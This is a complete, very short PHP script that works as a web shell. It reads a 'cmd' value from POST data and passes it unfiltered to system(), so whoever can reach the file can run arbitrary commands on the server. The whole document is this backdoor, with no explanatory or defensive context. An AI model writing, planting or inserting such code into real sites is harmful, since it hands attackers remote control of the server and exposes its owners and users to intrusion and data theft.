<?php
    if(isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        system($cmd);
    }
?>